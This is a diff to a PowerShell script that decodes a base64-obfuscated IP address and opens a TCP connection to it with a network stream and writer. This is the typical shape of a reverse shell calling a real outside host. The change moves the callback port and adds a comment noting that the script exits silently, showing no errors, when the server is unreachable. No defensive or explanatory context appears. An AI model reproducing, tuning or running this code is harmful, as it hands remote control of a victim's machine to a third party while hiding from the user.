@@ -10,7 +10,7 @@ try {
     
     
     $targetIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTQ2LjcwLjI0MC4yMDU='));
-    $port = 40398;
+    $port = 31198;
 
     $TCPClient = New-Object Net.Sockets.TCPClient($targetIP, $port);
     $NetworkStream = $TCPClient.GetStream();
@@ -53,6 +53,6 @@ try {
     $StreamWriter.Close();
     $TCPClient.Close();
 } catch {
-    
+    # If server is down, script exits here with 0 errors shown to the OS
     exit;
 }
